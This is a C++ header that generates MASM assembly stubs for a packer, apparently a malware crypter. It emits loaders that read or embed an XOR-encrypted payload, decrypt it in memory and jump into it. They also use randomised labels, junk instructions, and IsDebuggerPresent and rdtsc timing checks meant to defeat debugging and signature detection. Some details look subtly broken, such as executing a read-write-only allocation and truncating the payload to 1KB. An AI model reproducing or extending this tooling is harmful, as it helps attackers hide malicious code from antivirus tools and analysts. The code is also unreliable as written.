#pragma once

#include <string>
#include <sstream>
#include <vector>
#include <iomanip>
#include "polymorphic_engine.h"

class MASMGenerator {
private:
    PolymorphicEngine polyEngine;
    
public:
    // Generate MASM runtime stub for file reading and decryption
    std::string generateRuntimeStub(const std::string& targetFile, 
                                    const std::vector<uint8_t>& decryptionKey,
                                    bool usePolymorphic = true) {
        std::stringstream masm;
        
        // Generate unique labels if polymorphic
        std::string startLabel = usePolymorphic ? polyEngine.generateVarName() : "start";
        std::string dataLabel = usePolymorphic ? polyEngine.generateVarName() : "fileData";
        std::string keyLabel = usePolymorphic ? polyEngine.generateVarName() : "decryptKey";
        std::string loopLabel = usePolymorphic ? polyEngine.generateVarName() : "decryptLoop";
        std::string exitLabel = usePolymorphic ? polyEngine.generateVarName() : "exitProgram";
        
        // MASM header
        masm << "; MASM Runtime Stub - Generated by VS2022 PE Packer\n";
        masm << "; Target: " << targetFile << "\n";
        masm << ".386\n";
        masm << ".model flat, stdcall\n";
        masm << "option casemap:none\n\n";
        
        // Includes
        masm << "include \\masm32\\include\\windows.inc\n";
        masm << "include \\masm32\\include\\kernel32.inc\n";
        masm << "include \\masm32\\include\\user32.inc\n";
        masm << "includelib \\masm32\\lib\\kernel32.lib\n";
        masm << "includelib \\masm32\\lib\\user32.lib\n\n";
        
        // Data section
        masm << ".data\n";
        masm << "    szFileName db \"" << targetFile << "\", 0\n";
        masm << "    hFile dd ?\n";
        masm << "    dwFileSize dd ?\n";
        masm << "    dwBytesRead dd ?\n";
        masm << "    pFileBuffer dd ?\n";
        
        // Decryption key
        masm << "    " << keyLabel << " db ";
        for (size_t i = 0; i < decryptionKey.size(); i++) {
            masm << std::hex << std::setw(2) << std::setfill('0') 
                 << (int)decryptionKey[i] << "h";
            if (i < decryptionKey.size() - 1) masm << ", ";
        }
        masm << "\n";
        masm << "    dwKeySize dd " << decryptionKey.size() << "\n";
        
        if (usePolymorphic) {
            // Add polymorphic junk data
            masm << "\n    ; Polymorphic junk data\n";
            for (int i = 0; i < 5; i++) {
                masm << "    junk" << i << " dd " << (rand() % 0xFFFFFF) << "h\n";
            }
        }
        
        masm << "\n.code\n";
        masm << startLabel << ":\n";
        
        if (usePolymorphic) {
            // Add polymorphic junk instructions
            masm << "    ; Polymorphic junk code\n";
            masm << "    push eax\n";
            masm << "    mov eax, " << (rand() % 0xFFFF) << "h\n";
            masm << "    xor eax, " << (rand() % 0xFFFF) << "h\n";
            masm << "    pop eax\n\n";
        }
        
        // Open target file
        masm << "    ; Open target file\n";
        masm << "    push 0\n";
        masm << "    push FILE_ATTRIBUTE_NORMAL\n";
        masm << "    push OPEN_EXISTING\n";
        masm << "    push 0\n";
        masm << "    push FILE_SHARE_READ\n";
        masm << "    push GENERIC_READ\n";
        masm << "    push offset szFileName\n";
        masm << "    call CreateFileA\n";
        masm << "    mov hFile, eax\n";
        masm << "    cmp eax, INVALID_HANDLE_VALUE\n";
        masm << "    je " << exitLabel << "\n\n";
        
        // Get file size
        masm << "    ; Get file size\n";
        masm << "    push 0\n";
        masm << "    push hFile\n";
        masm << "    call GetFileSize\n";
        masm << "    mov dwFileSize, eax\n\n";
        
        // Allocate memory
        masm << "    ; Allocate memory for file\n";
        masm << "    push PAGE_READWRITE\n";
        masm << "    push MEM_COMMIT or MEM_RESERVE\n";
        masm << "    push dwFileSize\n";
        masm << "    push 0\n";
        masm << "    call VirtualAlloc\n";
        masm << "    mov pFileBuffer, eax\n";
        masm << "    test eax, eax\n";
        masm << "    jz " << exitLabel << "\n\n";
        
        // Read file
        masm << "    ; Read file into memory\n";
        masm << "    push 0\n";
        masm << "    push offset dwBytesRead\n";
        masm << "    push dwFileSize\n";
        masm << "    push pFileBuffer\n";
        masm << "    push hFile\n";
        masm << "    call ReadFile\n\n";
        
        // Close file
        masm << "    ; Close file handle\n";
        masm << "    push hFile\n";
        masm << "    call CloseHandle\n\n";
        
        // Decrypt in memory
        masm << "    ; Decrypt data in memory\n";
        masm << "    mov esi, pFileBuffer        ; Source pointer\n";
        masm << "    mov ecx, dwFileSize         ; Counter\n";
        masm << "    xor ebx, ebx                ; Key index\n\n";
        
        masm << loopLabel << ":\n";
        masm << "    mov al, byte ptr [esi]      ; Load byte\n";
        masm << "    mov dl, byte ptr [" << keyLabel << " + ebx] ; Load key byte\n";
        masm << "    xor al, dl                  ; XOR decrypt\n";
        masm << "    mov byte ptr [esi], al      ; Store back\n";
        masm << "    inc esi                     ; Next byte\n";
        masm << "    inc ebx                     ; Next key byte\n";
        masm << "    cmp ebx, dwKeySize\n";
        masm << "    jb @F\n";
        masm << "    xor ebx, ebx                ; Reset key index\n";
        masm << "@@:\n";
        masm << "    loop " << loopLabel << "\n\n";
        
        // Execute decrypted code
        masm << "    ; Execute decrypted code\n";
        masm << "    push pFileBuffer\n";
        masm << "    call pFileBuffer            ; Jump to decrypted code\n\n";
        
        // Exit
        masm << exitLabel << ":\n";
        masm << "    push 0\n";
        masm << "    call ExitProcess\n\n";
        masm << "end " << startLabel << "\n";
        
        return masm.str();
    }
    
    // Generate minimal loader stub (< 2KB)
    std::string generateMinimalStub(const std::vector<uint8_t>& encryptedData,
                                    const std::vector<uint8_t>& key) {
        std::stringstream masm;
        
        masm << "; Minimal MASM Stub (<2KB)\n";
        masm << ".386\n";
        masm << ".model flat, stdcall\n";
        masm << "option casemap:none\n\n";
        
        masm << "include \\masm32\\include\\windows.inc\n";
        masm << "include \\masm32\\include\\kernel32.inc\n";
        masm << "includelib \\masm32\\lib\\kernel32.lib\n\n";
        
        masm << ".data\n";
        
        // Embed encrypted data (first 1KB only for minimal stub)
        size_t dataSize = std::min(encryptedData.size(), size_t(1024));
        masm << "    payload db ";
        for (size_t i = 0; i < dataSize; i++) {
            if (i % 16 == 0 && i > 0) masm << "\n    db ";
            masm << std::hex << std::setw(2) << std::setfill('0') 
                 << (int)encryptedData[i] << "h";
            if (i < dataSize - 1) masm << ", ";
        }
        masm << "\n";
        masm << "    payloadSize dd " << dataSize << "\n";
        
        // Embed key
        masm << "    xorKey db ";
        for (size_t i = 0; i < key.size(); i++) {
            masm << std::hex << std::setw(2) << std::setfill('0') 
                 << (int)key[i] << "h";
            if (i < key.size() - 1) masm << ", ";
        }
        masm << "\n";
        masm << "    keySize dd " << key.size() << "\n\n";
        
        masm << ".code\n";
        masm << "start:\n";
        
        // Simple XOR decryption loop
        masm << "    mov esi, offset payload\n";
        masm << "    mov ecx, payloadSize\n";
        masm << "    xor ebx, ebx\n";
        masm << "decrypt:\n";
        masm << "    mov al, [esi]\n";
        masm << "    xor al, byte ptr [xorKey + ebx]\n";
        masm << "    mov [esi], al\n";
        masm << "    inc esi\n";
        masm << "    inc ebx\n";
        masm << "    cmp ebx, keySize\n";
        masm << "    jb @F\n";
        masm << "    xor ebx, ebx\n";
        masm << "@@:\n";
        masm << "    loop decrypt\n\n";
        
        // Execute payload
        masm << "    push offset payload\n";
        masm << "    ret\n\n";
        
        masm << "end start\n";
        
        return masm.str();
    }
    
    // Generate polymorphic MASM stub with anti-analysis
    std::string generatePolymorphicStub(const std::string& targetFile) {
        std::stringstream masm;
        
        // Generate random procedure names
        std::string mainProc = polyEngine.generateFuncName();
        std::string checkProc = polyEngine.generateFuncName();
        std::string decryptProc = polyEngine.generateFuncName();
        
        masm << "; Polymorphic MASM Stub with Anti-Analysis\n";
        masm << ".386\n";
        masm << ".model flat, stdcall\n";
        masm << "option casemap:none\n\n";
        
        masm << "include \\masm32\\include\\windows.inc\n";
        masm << "include \\masm32\\include\\kernel32.inc\n";
        masm << "includelib \\masm32\\lib\\kernel32.lib\n\n";
        
        masm << ".data\n";
        masm << "    szTarget db \"" << targetFile << "\", 0\n";
        
        // Add polymorphic junk data
        for (int i = 0; i < 10; i++) {
            masm << "    " << polyEngine.generateVarName() << " dd " 
                 << (rand() % 0xFFFFFF) << "h\n";
        }
        
        masm << "\n.code\n";
        
        // Anti-debugging check procedure
        masm << checkProc << " proc\n";
        masm << "    ; Check for debugger\n";
        masm << "    call IsDebuggerPresent\n";
        masm << "    test eax, eax\n";
        masm << "    jnz @exit\n";
        
        // Add timing check
        masm << "    rdtsc\n";
        masm << "    push eax\n";
        masm << "    push edx\n";
        
        // Junk instructions
        for (int i = 0; i < 5; i++) {
            masm << "    nop\n";
        }
        
        masm << "    rdtsc\n";
        masm << "    pop ecx\n";
        masm << "    sub eax, ecx\n";
        masm << "    cmp eax, 1000h\n";
        masm << "    ja @exit\n";
        masm << "    ret\n";
        
        masm << "@exit:\n";
        masm << "    push 0\n";
        masm << "    call ExitProcess\n";
        masm << checkProc << " endp\n\n";
        
        // Main procedure
        masm << mainProc << ":\n";
        masm << "    call " << checkProc << "\n";
        
        // Add polymorphic junk
        masm << "    ; Polymorphic junk\n";
        masm << "    push eax\n";
        masm << "    push ebx\n";
        masm << "    mov eax, " << (rand() % 0xFFFF) << "h\n";
        masm << "    mov ebx, " << (rand() % 0xFFFF) << "h\n";
        masm << "    xor eax, ebx\n";
        masm << "    add eax, ebx\n";
        masm << "    pop ebx\n";
        masm << "    pop eax\n\n";
        
        // Main logic would go here
        masm << "    ; Main packer logic\n";
        masm << "    push 0\n";
        masm << "    call ExitProcess\n\n";
        
        masm << "end " << mainProc << "\n";
        
        return masm.str();
    }
};